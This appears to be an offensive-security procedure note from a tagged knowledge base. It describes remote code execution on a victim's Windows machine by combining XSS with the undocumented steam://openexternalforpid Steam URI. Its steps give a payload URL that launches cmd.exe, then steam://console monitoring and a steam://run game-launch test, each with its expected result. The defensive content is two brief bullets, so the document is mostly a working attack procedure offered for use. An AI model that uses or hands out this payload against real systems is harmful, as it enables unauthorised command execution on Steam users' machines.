---
tags:
  - rce
  - steam
  - uri-abuse
type: procedure
tools:
  - '[[tools/Steam-Console]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/steam-openexternalforpid]]'
  - '[[commands/steam-console]]'
  - '[[commands/steam-run-gameid]]'
platforms:
  - Windows
techniques:
  - '[[Command-Line Interface]]'
skill_level: expert
impact_level: critical
detection_risk: high
sub_techniques: []
id: 67347e66-8120-4072-8985-bfcbc7966cfe
created_at: '2025-12-14T00:11:25.290Z'
updated_at: '2025-12-14T00:11:25.290Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Achieving RCE via Openexternalforpid

## Summary

This procedure achieves remote code execution by abusing the undocumented steam://openexternalforpid protocol.

## Description

Combine XSS with the protocol to run arbitrary commands like cmd.exe on the victim's Windows machine.

## Requirements

1. Escalated XSS access
2. Knowledge of victim's PID (e.g., 10400)
3. Steam console for monitoring

## Defense

Defensive measures and detection strategies:

- Patch undocumented URIs
- Sandbox external process invocations

## Objectives

1. Run arbitrary commands remotely
2. Monitor invocations
3. Confirm RCE

## Instructions

### Step 1: Craft RCE Payload

**Context**: Send malicious URL tag.

Use [[commands/steam-openexternalforpid]]:

```bash
steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe
```

> Expected: cmd.exe opens.

### Step 2: Monitor with Console

**Context**: Open Steam console.

Execute [[commands/steam-console]]:

```bash
steam://console
```

> Expected: Logs show invocation.

### Step 3: Test Game Launch

**Context**: Optional escalation test.

Run [[commands/steam-run-gameid]]:

```bash
steam://run/[GAMEID]
```

> Expected: Game launches.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/steam-openexternalforpid]]
- [[commands/steam-console]]
- [[commands/steam-run-gameid]]

## Tools Used

- [[tools/Steam-Console]]

## Tags

- rce
- steam
- uri-abuse
